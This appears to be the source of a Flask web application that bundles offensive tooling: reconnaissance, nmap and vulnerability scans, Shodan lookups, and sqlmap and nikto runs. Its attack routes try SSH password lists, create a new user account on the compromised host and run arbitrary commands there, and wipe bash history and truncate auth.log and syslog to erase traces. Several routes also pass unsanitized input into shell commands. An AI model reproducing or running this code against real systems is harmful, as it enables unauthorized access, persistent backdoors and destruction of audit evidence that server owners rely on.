from flask import Flask, render_template, request, jsonify, send_from_directory
import socket
import whois
import nmap
import threading
import time
# Simulate passive reconimport whois
import dns.resolver
import requests
import subprocess
import os
import json
import requests
import logging
import time
from passwordbase import filebased,bruitebased
import shodan

import paramiko

app = Flask(__name__)



@app.route('/clear-logs', methods=['POST'])
def clear_logs():
    try:
        # Get data from the request
        data = request.get_json()
        ip = data.get('ip')
        port = int(data.get('port'))
        sudo_user = data.get('sudoUser')
        sudo_password = data.get('sudoPassword')

        # Initialize SSH client
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Connect to the server using the provided sudo user and password
        ssh.connect(ip, port=port, username=sudo_user, password=sudo_password)

        # Prepare the commands to clear bash history and logs
        clear_history_command = "history -c && rm -f ~/.bash_history"
        clear_logs_command = "truncate -s 0 /var/log/auth.log && truncate -s 0 /var/log/syslog"

        # Execute the command to clear bash history
        stdin, stdout, stderr = ssh.exec_command(f'echo {sudo_password} | sudo -S bash -c "{clear_history_command}"')
        history_status = stdout.channel.recv_exit_status()  # Wait for the command to complete

        # Execute the command to clear logs
        stdin, stdout, stderr = ssh.exec_command(f'echo {sudo_password} | sudo -S bash -c "{clear_logs_command}"')
        logs_status = stdout.channel.recv_exit_status()  # Wait for the command to complete

        # Close the SSH connection
        ssh.close()

        # Check if both commands executed successfully
        if history_status == 0 and logs_status == 0:
            return jsonify({'message': 'Logs and history cleared successfully.'}), 200
        else:
            error_message = stderr.read().decode()
            return jsonify({'error': f'Failed to clear logs or history: {error_message}'}), 500

    except Exception as e:
        return jsonify({'error': str(e)}), 500


@app.route('/exploit', methods=['POST'])
def exploit():
    try:
        # Get the JSON payload from the request
        data = request.get_json()

        # Extract the values sent from the frontend
        host = data.get('host')
        port = data.get('port')
        passwords = data.get('passwords', False)
        bruteforce = data.get('bruite', False) 

        if passwords:
            passw = filebased()
            result = {
            "host": host,
            "port": port,
            "usename":"kali",
            "passwords": passw
            }
            return result
    except Exception as e:
            return jsonify({"error": str(e)}), 500




@app.route('/execute-command', methods=['POST'])
def execute_command():
    try:
        # Get data from the request
        data = request.get_json()
        ip = data.get('ip')
        port = int(data.get('port'))
        username = data.get('username')
        passwords = data.get('passwords')
        new_username = data.get('newUsername')
        new_password = data.get('newPassword')
        command = data.get('command')

        # Initialize SSH client
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        # Attempt to connect using the provided passwords
        for password in passwords:
            try:
                ssh.connect(ip, port=port, username=username, password=password)
                break  # Exit the loop if connection is successful
            except paramiko.AuthenticationException:
                continue  # Try the next password
        else:
            return jsonify({'error': 'Authentication failed for all provided passwords.'}), 403

        # Prepare the command to create a new user and set password
        create_user_command = f'echo "{new_password}" | sudo -S useradd -m -s /bin/bash {new_username} && echo "{new_username}:{new_password}" | sudo -S chpasswd'

        # Execute the command to create a new user with sudo
        stdin, stdout, stderr = ssh.exec_command(create_user_command)

        # Send the sudo password to stdin
        stdin.write(password + '\n')  # Send the password for sudo
        stdin.flush()  # Ensure the command is executed

        # Wait for the command to complete
        exit_status = stdout.channel.recv_exit_status()
        if exit_status != 0:
            error = stderr.read().decode()
            return jsonify({'error': f'Failed to create user: {error}'}), 500

        # Check if the user was created successfully
        check_user_command = f'id -u {new_username}'
        stdin, stdout, stderr = ssh.exec_command(check_user_command)
        exit_status = stdout.channel.recv_exit_status()
        if exit_status != 0:
            return jsonify({'error': f'User {new_username} was not created successfully.'}), 500

        # Optionally execute the provided command
        stdin, stdout, stderr = ssh.exec_command(command)
        output = stdout.read().decode()
        error = stderr.read().decode()

        # Close the SSH connection
        ssh.close()

        # Return the command output
        return jsonify({
            'output': output,
            'error': error,
            'message': 'User created and command executed successfully.'
        })

    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/enumeration', methods=['POST'])
def enumeration():
    data = request.get_json()
    target = data.get('target')
    port_range = data.get('portRange')
    specific_ports = data.get('specificPorts')
    scan_type = data.get('scanType')
    scripts = data.get('scripts')
    timeout = data.get('timeout')
    output_format = data.get('outputFormat', 'normal')

    nm = nmap.PortScanner()

    try:
        arguments = []
        if port_range:
            arguments.append(f'-p {port_range}')
        if specific_ports:
            arguments.append(f'-p {specific_ports}')
        if timeout:
            arguments.append(f'--host-timeout {timeout}s')

        arguments_str = ' '.join(arguments)

        if scan_type == 'service':
            nm.scan(target, arguments=f'{arguments_str} -sV')
        elif scan_type == 'os':
            nm.scan(target, arguments=f'{arguments_str} -O')
        elif scan_type == 'dns':
            nm.scan(target, arguments=f'{arguments_str} --script=dns-enum')
        elif scan_type == 'smb':
            nm.scan(target, arguments=f'{arguments_str} --script=smb-enum-shares.nse')
        elif scan_type == 'snmp':
            nm.scan(target, arguments=f'{arguments_str} --script=snmp-*')
        elif scan_type == 'ldap':
            nm.scan(target, arguments=f'{arguments_str} --script=ldap-search')
        elif scan_type == 'http':
            nm.scan(target, arguments=f'{arguments_str} --script=http-enum')
        else:
            return jsonify({'status': 'error', 'message': 'Invalid scan type.'}), 400

        # Get scan results
        scan_results = nm[target]

        # Format scan results for response
        result = {
            'host': target,
            'hostname': scan_results.get('hostnames', []),
            'status': scan_results.get('status', {}),
            'protocols': scan_results.get('protocols', {}),
            'services': scan_results.get('tcp', {}),
            'output_format': output_format  # Add other details based on output format
        }

        return jsonify({'status': 'success', 'scan_results': result}), 200

    except Exception as e:
        return jsonify({'status': 'error', 'message': str(e)}), 500



def run_vuln_scan(target_ip, scan_type, port_range, os_type, risk_level):
    nm = nmap.PortScanner()

    try:
        # Choose the scan arguments based on the type of scan and risk level
        scan_args = '-sV --script vuln'
        if scan_type == 'full':
            scan_args += ' -p-'
        elif scan_type == 'vuln':
            scan_args += ' --script vulners'

        # Add custom port range if specified
        if port_range:
            scan_args += f" -p {port_range}"

        # Add OS detection if specified
        if os_type:
            scan_args += f" --osscan-guess"

        # Run the actual scan
        result = nm.scan(target_ip, arguments=scan_args)

        return result
    except Exception as e:
        return {'error': str(e)}

@app.route('/vulnerability-scan', methods=['POST'])
def vulnerability_scan():


    print('scan vulnerabilities')
    data = request.get_json()
    target_ip = data.get('target', 'scanme.nmap.org')  # default to scanme.nmap.org
    scan_type = data.get('scan_type', 'basic')
    port_range = data.get('port_range', None)
    os_type = data.get('os_type', None)
    risk_level = data.get('risk_level', 'all')

    # Run the vulnerability scan
    scan_results = run_vuln_scan(target_ip, scan_type, port_range, os_type, risk_level)

    if 'error' in scan_results:
        return jsonify({'status': 'error', 'message': scan_results['error']}), 500

    print('all done for vulnerablility')

    return jsonify({'status': 'success', 'scan_results': scan_results}), 200


# Passive Recon Function
def passive_recon(domain, ip, email, whois_lookup, dns_flag, social_media, email_enum):
    result = {}

    # WHOIS check (note: renamed flag from 'whois' to 'whois_lookup')
    if whois_lookup and domain:
        try:
            whois_info = whois.whois(domain)
            result['whois_info'] = whois_info
        except Exception as e:
            result['whois_info'] = f"WHOIS lookup failed: {e}"

    # DNS check
    if dns_flag and domain:
        try:
            dns_records = dns.resolver.resolve(domain, 'A')
            result['dns_records'] = [str(rdata) for rdata in dns_records]
        except Exception as e:
            result['dns_records'] = f"DNS lookup failed: {e}"

    # Email Enumeration (Breach Check)
    if email_enum and email:
        try:
            result['email_enum_info'] = check_email_breach(email)
        except Exception as e:
            result['email_enum_info'] = f"Error: {e}"

    # Social Media Lookup (GitHub Example)
    if social_media and email:
        try:
            result['social_media_info'] = check_github_user(email)
        except Exception as e:
            result['social_media_info'] = f"Error: {e}"

    return result

def check_email_breach(email):
    headers = {
        'User-Agent': 'Passive Recon Tool',
        'hibp-api-key': 'your_api_key_here'
    }
    response = requests.get(f'https://haveibeenpwned.com/api/v3/breachedaccount/{email}', headers=headers)
    
    if response.status_code == 200:
        return response.json()
    elif response.status_code == 404:
        return "No breaches found."
    else:
        return f"Error: {response.status_code}"

def check_github_user(email):
    headers = {'Accept': 'application/vnd.github.v3+json'}
    response = requests.get(f'https://api.github.com/search/users?q={email}', headers=headers)
    if response.status_code == 200:
        return response.json()
    return "No users found."
# Route to serve the HTML page
@app.route('/')
def index():
    return render_template('passiverecon.html')

@app.route('/<filename>.html')
def serve_html(filename):
    try:
        return send_from_directory('templates', f'{filename}.html')
    except Exception as e:
        return f"Error: {e}", 404

# API route for passive recon
@app.route('/passive-recon', methods=['POST'])
def perform_recon():
    data = request.get_json()

    domain = data.get('domain')
    ip = data.get('ip')
    email = data.get('email')
    whois = data.get('whois')
    dns = data.get('dns')
    social_media = data.get('social_media')
    email_enum = data.get('email_enum')

    # Trigger passive recon
    recon_result = passive_recon(domain, ip, email, whois, dns, social_media, email_enum)

    return jsonify(recon_result)


@app.route('/active-recon', methods=['POST'])
def active_recon():
    data = request.json
    target = data.get('domain')
    port_range = data.get('port_range')
    scan_type = data.get('scan_type')
    os_detection = data.get('os_detection', False)
    service_version = data.get('service_version', False)
    vulnerability_scan = data.get('vulnerability_scan', False)
    traceroute = data.get('traceroute', False)
    ping_sweep = data.get('ping_sweep', False)
    fragmentation = data.get('fragmentation', False)

    # Initialize the Nmap scanner
    nm = nmap.PortScanner()

    # Build the Nmap scan command
    nmap_args = ""
    
    # Add scan type
    if scan_type == 'tcp_syn':
        nmap_args += '-sS '  # TCP SYN Scan
    elif scan_type == 'tcp_connect':
        nmap_args += '-sT '  # TCP Connect Scan
    elif scan_type == 'udp':
        nmap_args += '-sU '  # UDP Scan
    elif scan_type == 'ping':
        nmap_args += '-sn '  # Ping Scan (Host discovery)

    # Add optional flags
    if os_detection:
        nmap_args += '-O '  # Enable OS detection
    if service_version:
        nmap_args += '-sV '  # Service version detection
    if vulnerability_scan:
        nmap_args += '--script vuln '  # Vulnerability scan using Nmap scripts
    if traceroute:
        nmap_args += '--traceroute '  # Enable traceroute
    if ping_sweep:
        nmap_args += '-PE '  # Ping sweep
    if fragmentation:
        nmap_args += '-f '  # Packet Fragmentation

    # Add port range if provided
    if port_range:
        ports = port_range
    else:
        ports = '1-1024'  # Default port range if none provided

    try:
        # Run the Nmap scan
        scan_result = nm.scan(hosts=target, arguments=nmap_args, ports=ports)

        # Format the results
        return jsonify({
            'status': 'success',
            'target': target,
            'nmap_args': nmap_args,
            'scan_results': scan_result
        })
    except Exception as e:
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 500


#need to use the valid key for showan, deleted demo key
SHODAN_API_KEY = "your_shodan_api_key"

@app.route('/shodan-recon', methods=['POST'])
def shodan_recon():
    data = request.get_json()
    ip = data.get('ip')

    try:
        api = shodan.Shodan(SHODAN_API_KEY)
        result = api.host(ip)
        return jsonify({'shodan_data': result})
    except shodan.APIError as e:
        return jsonify({'error': f"Shodan API error: {e}"}), 500

@app.route('/sqlmap-scan', methods=['POST'])
def sqlmap_scan():
    data = request.get_json()
    target_url = data.get('url')

    try:
        output = subprocess.check_output(f"sqlmap -u {target_url} --batch --dump", shell=True, stderr=subprocess.STDOUT)
        return jsonify({'status': 'success', 'output': output.decode()})
    except subprocess.CalledProcessError as e:
        return jsonify({'error': e.output.decode()}), 500


@app.route('/nikto-scan', methods=['POST'])
def nikto_scan():
    data = request.get_json()
    target_url = data.get('url')

    try:
        output = subprocess.check_output(f"nikto -h {target_url}", shell=True)
        return jsonify({'status': 'success', 'output': output.decode()})
    except subprocess.CalledProcessError as e:
        return jsonify({'error': e.output.decode()}), 500



if __name__ == '__main__':
    app.run(debug=True)
